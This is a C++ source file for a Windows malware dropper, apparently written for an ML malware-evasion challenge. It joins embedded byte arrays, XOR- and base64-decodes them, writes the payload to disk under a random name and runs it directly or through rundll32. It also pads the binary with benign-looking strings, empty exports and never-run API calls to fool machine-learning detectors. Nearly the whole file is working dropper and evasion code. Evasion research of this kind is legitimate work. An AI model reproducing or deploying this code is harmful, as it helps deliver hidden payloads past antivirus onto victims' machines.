// Drops and executes an Executable Binary from the PE Resources
// Created By Marcus Botacin for the MLSEC challenge
// Changelog: Created in 2019, updated in 2020 with obfuscation tricks

// disable deprecation
#define _CRT_SECURE_NO_WARNINGS

// Required Imports
#include<iostream>
#include<stdio.h>		// Debug Prints
#include<Windows.h>		// Resource Management
#include"binary_data.h"	// Resources Definition
#include<time.h>		// rand seed

// Imports for the dead code function
#include<commctrl.h>
#include<shlobj.h>
#include<Uxtheme.h>
#include<atlstr.h>
#include<atlenc.h>

// Linking with teh dead imports
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "uxtheme.lib")
#pragma comment(lib, "gdi32.lib")

//dead strings
const char* strings_array[] = {	"Hello, world!", "This is a benign string.", "No malicious intent here.", "Just plain text.", "Adding some goodware strings.", "Peace and love.", "Keep coding!", "Stay positive.", "Have a nice day!", "Coding is fun.", "Learning never ends.", "Be kind to one another.", "Spread happiness.", "Make someone smile today.", "Dream big.", "Work hard, dream big.", "Believe in yourself.", "You are capable of great things.", "Stay curious.", "Never stop learning.", "Life is an adventure.", "Enjoy the journey.", "Take risks.", "Embrace failure as part of the learning process.", "Chase your dreams.", "Create your own path.", "You are unique.", "Be yourself.", "Be the change you wish to see in the world.", "Kindness is contagious.", "Small acts of kindness can make a big difference.", "Spread positivity.", "Love conquers all.", "Family first.", "Friends are the family we choose for ourselves.", "Laughter is the best medicine.", "Find joy in the little things.", "Seize the day.", "Carpe diem.", "Live in the moment.", "Appreciate what you have.", "Gratitude is the key to happiness.", "Be present.", "Breathe deeply.", "Stay calm and carry on.", "Keep moving forward.", "You got this!", "Never give up.", "Tomorrow is a new day.", "Hope is the anchor of the soul."};

// Dead Exports
extern "C" { __declspec(dllexport) void MyCreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam) { return; } }
extern "C" { __declspec(dllexport) void MyGetDC(HWND hWnd) { return; } }
extern "C" { __declspec(dllexport) void MyReleaseDC(HWND hWnd, HDC hDC) { return; } }
extern "C" { __declspec(dllexport) void MyBeginPaint(HWND hWnd, PAINTSTRUCT* lpPaint) { return; } }
extern "C" { __declspec(dllexport) void MyEndPaint(HWND hWnd, const PAINTSTRUCT* lpPaint) { return; } }
extern "C" { __declspec(dllexport) void MyGetClientRect(HWND hWnd, LPRECT lpRect) { return; } }
extern "C" { __declspec(dllexport) void MyDrawTextA(HDC hdc, LPCSTR lpchText, int nCount, LPRECT lpRect, UINT uFormat) { return; } }
extern "C" { __declspec(dllexport) void MyRectangle(HDC hdc, int left, int top, int right, int bottom) { return; } }
extern "C" { __declspec(dllexport) void MyEllipse(HDC hdc, int left, int top, int right, int bottom) { return; } }
extern "C" { __declspec(dllexport) void MyMoveToEx(HDC hdc, int x, int y, LPPOINT lpPoint) { return; } }
extern "C" { __declspec(dllexport) void MyLineTo(HDC hdc, int x, int y) { return; } }
extern "C" { __declspec(dllexport) void MyCreateCompatibleDC(HDC hdc) { return; } }
extern "C" { __declspec(dllexport) void MySelectObject(HDC hdc, HGDIOBJ h) { return; } }
extern "C" { __declspec(dllexport) void MyCreatePen(int iStyle, int cWidth, COLORREF color) { return; } }
extern "C" { __declspec(dllexport) void MyCreateBrushIndirect(LPLOGBRUSH lplb) { return; } }
extern "C" { __declspec(dllexport) void MyTextOutA(HDC hdc, int x, int y, LPCSTR lpString, int c) { return; } }
extern "C" { __declspec(dllexport) void MySetTextColor(HDC hdc, COLORREF color) { return; } }
extern "C" { __declspec(dllexport) void MySetBkColor(HDC hdc, COLORREF color) { return; } }
extern "C" { __declspec(dllexport) void MySetBkMode(HDC hdc, int mode) { return; } }

// Functions prototypes
void dead();
void drop(int size, void* buffer);
void* XOR(void* data, int size);
void* base64decode(void* data, DWORD* size);
void launch();
void set_name();

// Dropper Configurations
#define DEAD_IMPORTS
#define XOR_ENCODE
#define XOR_KEY 0x73
#define BASE64
#define RANDOM_NAME
#define NAME_SIZE 10
//#define INJECT

// global: final binary name
char name[10 * NAME_SIZE];

//split array 1

// Entry Point
int main()
{
	//merge arrays
    unsigned int total_size = sizeof(binary_data_array) + data_size1 + data_size2;

    unsigned char *merged_array = (unsigned char *)malloc(total_size);
    if (merged_array == NULL) {
        printf("Memory allocation failed.\n");
        return 1;
    }

    memcpy(merged_array, binary_data_array, sizeof(binary_data_array));
	memcpy(merged_array + sizeof(binary_data_array), binary_data_array1, data_size1);
	memcpy(merged_array + sizeof(binary_data_array) + data_size1, binary_data_array2, data_size2);

	void* data = static_cast<void*>(merged_array);
	DWORD size = static_cast<DWORD>(total_size);
	// Obfuscation Procedures start here

	//print dead strings
	for (const char* str : strings_array) { std::cout << str << std::endl; }

#ifdef XOR_ENCODE
	data = XOR(data, size);
#endif
#ifdef BASE64
	data = base64decode(data, &size);
#endif
	// where to drop
	set_name();
	// Drop to Disk
	drop(size, data);
	// launch process
	launch();
#ifdef DEAD_CODE
	dead code
	dead();
#endif
	// exit without waiting child process
	return 0;
}

void set_name()
{
#ifdef RANDOM_NAME
	int valid = 0;
	srand(time(NULL));
	while (valid < NAME_SIZE)
	{
		char c = rand();
		if (c >= 'a' && c <= 'z')
		{
			name[valid++] = c;
		}
	}
#else
	strcpy(name, "proc");
#endif
#ifdef INJECT
	strcat(name, ".dll");
#else
	strcat(name, ".exe");
#endif
}

// Launch a New Process based on the dropped file name
void launch()
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	// build injection command
#ifdef INJECT
	char cmd[10 * NAME_SIZE] = L"C:\\Windows\\system32\\rundll32.exe";
	char args[10 * NAME_SIZE];
	sprintf(args, "%s %s,#1", cmd, name);
	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	// call directly
#else
	CreateProcessA(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
#endif
}

// Decode a Base64 String
void* base64decode(void* data, DWORD* size)
{
	// original string size
	int original_size = strlen((char*)data);
	// number of bytes after decoded
	int decoded_size = Base64DecodeGetRequiredLength(original_size);
	// temporary buffer to store the decoded bytes
	void* buffer2 = malloc(decoded_size);
	// decoded
	Base64Decode((PCSTR)data, original_size, (BYTE*)buffer2, &decoded_size);
	// return new buffer size
	*size = decoded_size;
	// return new buffer
	return buffer2;
	// old buffer is lost (without freeing, sorry)
}

// XOR bytes in the buffer with a key
void* XOR(void* data, int size) {
	// auxiliary buffer
	// this is never freed, but ok, i'm not a goodware anyway
	void* buffer = malloc(size);
	for (int i = 0; i < size; i++)
	{
		((char*)buffer)[i] = ((char*)data)[i] ^ XOR_KEY;
	}
	return buffer;
}

// Drop buffer to file
void drop(int size, void* buffer)
{
	FILE* f = fopen(name, "wb");
	// traverse byte list
	for (int i = 0; i < size; i++)
	{
		// byte pointer
		unsigned char c1 = ((char*)buffer)[i];
		// drop byte to file
		fprintf(f, "%c", c1);
	}
	// file fully written
	fclose(f);
}

// Dead Imports Function
void dead()
{
	return;
	memcpy(NULL, NULL, NULL);
	memset(NULL, NULL, NULL);
	strcpy(NULL, NULL);
	ShellAboutW(NULL, NULL, NULL, NULL);
	SHGetSpecialFolderPathW(NULL, NULL, NULL, NULL);
	ShellMessageBox(NULL, NULL, NULL, NULL, NULL);
	RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegOpenKeyExW(NULL, NULL, NULL, NULL, NULL);
	RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegDeleteKeyW(NULL, NULL);
	RegQueryInfoKeyW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegQueryValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegSetValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegCloseKey(NULL);
	RegCreateKey(NULL, NULL, NULL);
	BSTR_UserFree(NULL, NULL);
	BufferedPaintClear(NULL, NULL);
	CoInitialize(NULL);
	CoUninitialize();
	CLSID x;
	CoCreateInstance(x, NULL, NULL, x, NULL);
	IsThemeActive();
	ImageList_Add(NULL, NULL, NULL);
	ImageList_Create(NULL, NULL, NULL, NULL, NULL);
	ImageList_Destroy(NULL);
	WideCharToMultiByte(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	lstrlenA(NULL);
	GetStartupInfoW(NULL);
	DeleteCriticalSection(NULL);
	LeaveCriticalSection(NULL);
	EnterCriticalSection(NULL);
	GetSystemTime(NULL);
	CreateEventW(NULL, NULL, NULL, NULL);
	CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
	ResetEvent(NULL);
	SetEvent(NULL);
	CloseHandle(NULL);
	GlobalSize(NULL);
	GlobalLock(NULL);
	GlobalUnlock(NULL);
	GlobalAlloc(NULL, NULL);
	lstrcmpW(NULL, NULL);
	MulDiv(NULL, NULL, NULL);
	GlobalFindAtomW(NULL);
	GetLastError();
	lstrlenW(NULL);
	CompareStringW(NULL, NULL, NULL, NULL, NULL, NULL);
	HeapDestroy(NULL);
	HeapReAlloc(NULL, NULL, NULL, NULL);
	HeapSize(NULL, NULL, NULL);
	SetBkColor(NULL, NULL);
	SetBkMode(NULL, NULL);
	EmptyClipboard();
	CreateDIBSection(NULL, NULL, NULL, NULL, NULL, NULL);
	GetStockObject(NULL);
	CreatePatternBrush(NULL);
	DeleteDC(NULL);
	EqualRgn(NULL, NULL);
	CombineRgn(NULL, NULL, NULL, NULL);
	SetRectRgn(NULL, NULL, NULL, NULL, NULL);
	CreateRectRgnIndirect(NULL);
	GetRgnBox(NULL, NULL);
	CreateRectRgn(NULL, NULL, NULL, NULL);
	CreateCompatibleBitmap(NULL, NULL, NULL);
	LineTo(NULL, NULL, NULL);
	MoveToEx(NULL, NULL, NULL, NULL);
	ExtCreatePen(NULL, NULL, NULL, NULL, NULL);
	GetObjectW(NULL, NULL, NULL);
	GetTextExtentPoint32W(NULL, NULL, NULL, NULL);
	GetTextMetricsW(NULL, NULL);
	CreateSolidBrush(NULL);
	SetTextColor(NULL, NULL);
	GetDeviceCaps(NULL, NULL);
	CreateCompatibleDC(NULL);
	CreateFontIndirectW(NULL);
	SelectObject(NULL, NULL);
	GetTextExtentPointW(NULL, NULL, NULL, NULL);
	RpcStringFreeW(NULL);
	UuidToStringW(NULL, NULL);
	UuidCreate(NULL);
	timeGetTime();
	SetBkColor(NULL, NULL);
	free(NULL);
	isspace(NULL);
	tolower(NULL);
	abort();
	isalnum(NULL);
	isdigit(NULL);
	isxdigit(NULL);
	toupper(NULL);
	malloc(NULL);
	free(NULL);
	memmove(NULL, NULL, NULL);
	isalpha(NULL);

	//Added Imports
	MessageBox(NULL, NULL, NULL, NULL);
	Sleep(NULL);
	CloseHandle(NULL);
	GetLastError();
	FreeLibrary(NULL);
	CreateDialogA(NULL, NULL, NULL, NULL);
	CreateDialogIndirectA(NULL, NULL, NULL, NULL);
	CreateDialogIndirectParamA(NULL, NULL, NULL, NULL, NULL);
	CreateDialogIndirectParamW(NULL, NULL, NULL, NULL, NULL);
	CreateDialogIndirectW(NULL, NULL, NULL, NULL);
	CreateDialogParamA(NULL, NULL, NULL, NULL, NULL);
	CreateDialogParamW(NULL, NULL, NULL, NULL, NULL);
	CreateDialogW(NULL, NULL, NULL, NULL);
	DefDlgProcA(NULL, NULL, NULL, NULL);
	DefDlgProcW(NULL, NULL, NULL, NULL);
	DialogBoxA(NULL, NULL, NULL, NULL);
	DialogBoxIndirectA(NULL, NULL, NULL, NULL);
	DialogBoxIndirectParamA(NULL, NULL, NULL, NULL, NULL);
	DialogBoxIndirectParamW(NULL, NULL, NULL, NULL, NULL);
	DialogBoxIndirectW(NULL, NULL, NULL, NULL);
	DialogBoxParamA(NULL, NULL, NULL, NULL, NULL);
	DialogBoxParamW(NULL, NULL, NULL, NULL, NULL);
	DialogBoxW(NULL, NULL, NULL, NULL);
	EndDialog(NULL, NULL);
	GetDialogBaseUnits();
	GetDlgCtrlID(NULL);
	GetDlgItem(NULL, NULL);
	GetDlgItemInt(NULL, NULL, NULL, NULL);
	GetDlgItemTextA(NULL, NULL, NULL, NULL);
	GetDlgItemTextW(NULL, NULL, NULL, NULL);
	GetNextDlgGroupItem(NULL, NULL, NULL);
	GetNextDlgTabItem(NULL, NULL, NULL);
	IsDialogMessageA(NULL, NULL);
	IsDialogMessageW(NULL, NULL);
	MapDialogRect(NULL, NULL);
	MessageBox(NULL, NULL, NULL, NULL);
	MessageBoxA(NULL, NULL, NULL, NULL);
	MessageBoxExA(NULL, NULL, NULL, NULL, NULL);
	MessageBoxExW(NULL, NULL, NULL, NULL, NULL);
	MessageBoxIndirectA(NULL);
	MessageBoxIndirectW(NULL);
	MessageBoxW(NULL, NULL, NULL, NULL);
	SendDlgItemMessageA(NULL, NULL, NULL, NULL, NULL);
	SendDlgItemMessageW(NULL, NULL, NULL, NULL, NULL);
	SetDlgItemInt(NULL, NULL, NULL, NULL);
	SetDlgItemTextA(NULL, NULL, NULL);
	SetDlgItemTextW(NULL, NULL, NULL);
}